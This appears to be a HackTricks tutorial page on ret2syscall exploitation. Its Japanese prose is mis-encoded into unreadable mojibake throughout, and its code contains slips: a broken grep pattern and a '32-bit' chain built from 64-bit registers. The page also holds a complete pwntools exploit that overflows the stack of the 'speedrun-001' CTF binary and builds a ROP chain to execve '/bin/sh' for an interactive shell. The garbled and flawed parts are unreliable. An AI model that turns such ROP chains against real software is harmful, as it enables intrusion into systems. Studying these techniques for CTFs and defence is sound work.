# Ret2syscall

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## åŸºæœ¬æƒ…å ±

ã“ã‚Œã¯Ret2libã«ä¼¼ã¦ã„ã¾ã™ãŒã€ã“ã®å ´åˆã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‹ã‚‰é–¢æ•°ã‚’å‘¼ã³å‡ºã™ã®ã§ã¯ãªãã€`sys_execve` ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã—ã¦ `/bin/sh` ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®å¼•æ•°ã‚’ç”¨æ„ã—ã¾ã™ã€‚ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯é€šå¸¸ã€é™çš„ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã§å®Ÿè¡Œã•ã‚Œã€å¤šãã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¨ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«å‘½ä»¤ãŒã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«**ã‚’å‘¼ã³å‡ºã™ãŸã‚ã«ã¯ã€æ¬¡ã®æ§‹æˆãŒå¿…è¦ã§ã™ï¼š

* `rax: 59 sys_execve ã‚’æŒ‡å®š`
* `rdi: "/bin/sh" ã¸ã®ãƒã‚¤ãƒ³ã‚¿ã‚’æŒ‡å®šã—ã¦å®Ÿè¡Œã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŒ‡å®š`
* `rsi: 0 å¼•æ•°ãŒæ¸¡ã•ã‚Œã¦ã„ãªã„ã“ã¨ã‚’æŒ‡å®š`
* `rdx: 0 ç’°å¢ƒå¤‰æ•°ãŒæ¸¡ã•ã‚Œã¦ã„ãªã„ã“ã¨ã‚’æŒ‡å®š`

ã¤ã¾ã‚Šã€æ–‡å­—åˆ— `/bin/sh` ã‚’ã©ã“ã‹ã«æ›¸ãè¾¼ã‚“ã§ã‹ã‚‰ `syscall` ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã‚¹ã‚¿ãƒƒã‚¯ã‚’åˆ¶å¾¡ã™ã‚‹ãŸã‚ã«å¿…è¦ãªãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼‰ã€‚ãã®ãŸã‚ã«ã¯ã€æ—¢çŸ¥ã®é ˜åŸŸã« `/bin/sh` ã‚’æ›¸ãè¾¼ã‚€ãŸã‚ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒå¿…è¦ã§ã™ã€‚

{% hint style="success" %}
å‘¼ã³å‡ºã™ã®ã«èˆˆå‘³æ·±ã„åˆ¥ã®ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã¯ **`mprotect`** ã§ã€ã“ã‚Œã«ã‚ˆã‚Šæ”»æ’ƒè€…ã¯ **ãƒ¡ãƒ¢ãƒªå†…ã®ãƒšãƒ¼ã‚¸ã®æ¨©é™ã‚’å¤‰æ›´** ã§ãã¾ã™ã€‚ã“ã‚Œã¯ [**ret2shellcode**](../stack-overflow/stack-shellcode.md) ã¨çµ„ã¿åˆã‚ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

## ãƒ¬ã‚¸ã‚¹ã‚¿ã‚¬ã‚¸ã‚§ãƒƒãƒˆ

ã¾ãšã€**ã“ã‚Œã‚‰ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’åˆ¶å¾¡ã™ã‚‹æ–¹æ³•**ã‚’è¦‹ã¤ã‘ã¾ã—ã‚‡ã†ï¼š
```bash
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
ã“ã‚Œã‚‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã€**ã‚¹ã‚¿ãƒƒã‚¯ã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æ›¸ãè¾¼ã¿ã€ãƒ¬ã‚¸ã‚¹ã‚¿ã«ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒå¯èƒ½**ã§ã™ã€‚

## æ–‡å­—åˆ—ã®æ›¸ãè¾¼ã¿

### æ›¸ãè¾¼ã¿å¯èƒ½ãªãƒ¡ãƒ¢ãƒª

ã¾ãšã€ãƒ¡ãƒ¢ãƒªå†…ã®æ›¸ãè¾¼ã¿å¯èƒ½ãªå ´æ‰€ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### ãƒ¡ãƒ¢ãƒªã«æ–‡å­—åˆ—ã‚’æ›¸ãè¾¼ã‚€

æ¬¡ã«ã€ã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä»»æ„ã®å†…å®¹ã‚’æ›¸ãè¾¼ã‚€æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
### ROPãƒã‚§ãƒ¼ãƒ³ã®è‡ªå‹•åŒ–

æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€write-what-whereã‚¬ã‚¸ã‚§ãƒƒãƒˆã¨ã‚·ã‚¹ã‚³ãƒ¼ãƒ«å‘½ä»¤ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«ã€é™çš„ãƒã‚¤ãƒŠãƒªã‚’æŒ‡å®šã—ã¦å®Œå…¨ãª`sys_execve` ROPãƒã‚§ãƒ¼ãƒ³ã‚’ä½œæˆã—ã¾ã™ï¼š
```bash
ROPgadget --binary vuln --ropchain
```
#### 32 ãƒ“ãƒƒãƒˆ
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 ãƒ“ãƒƒãƒˆ
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ä¸è¶³

**ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒä¸è¶³ã—ã¦ã„ã‚‹**å ´åˆã€ä¾‹ãˆã°ãƒ¡ãƒ¢ãƒªã«`/bin/sh`ã‚’æ›¸ãè¾¼ã‚€ãŸã‚ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒä¸è¶³ã—ã¦ã„ã‚‹å ´åˆã€**SROPãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ã™ã¹ã¦ã®ãƒ¬ã‚¸ã‚¹ã‚¿å€¤ï¼ˆRIPãŠã‚ˆã³ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’å«ã‚€ï¼‰ã‚’åˆ¶å¾¡**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="srop-sigreturn-oriented-programming.md" %}
[srop-sigreturn-oriented-programming.md](srop-sigreturn-oriented-programming.md)
{% endcontent-ref %}

## æ”»æ’ƒä¾‹
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## ãã®ä»–ã®ä¾‹ã¨å‚è€ƒæ–‡çŒ®

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)
* 64ãƒ“ãƒƒãƒˆã€PIEãªã—ã€nxã€`execve`ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ROPã‚’ãƒ¡ãƒ¢ãƒªã«æ›¸ãè¾¼ã¿ã€ãã“ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚
* [https://guyinatuxedo.github.io/07-bof\_static/bkp16\_simplecalc/index.html](https://guyinatuxedo.github.io/07-bof\_static/bkp16\_simplecalc/index.html)
* 64ãƒ“ãƒƒãƒˆã€nxã€PIEãªã—ã€`execve`ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ROPã‚’ãƒ¡ãƒ¢ãƒªã«æ›¸ãè¾¼ã¿ã€ãã“ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚æ•°å­¦æ¼”ç®—ã‚’è¡Œã†é–¢æ•°ã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«æ›¸ãè¾¼ã‚€ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã¾ã™ã€‚
* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64ãƒ“ãƒƒãƒˆã€PIEãªã—ã€nxã€BFã‚­ãƒ£ãƒŠãƒªã€`execve`ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ROPã‚’ãƒ¡ãƒ¢ãƒªã«æ›¸ãè¾¼ã¿ã€ãã“ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚
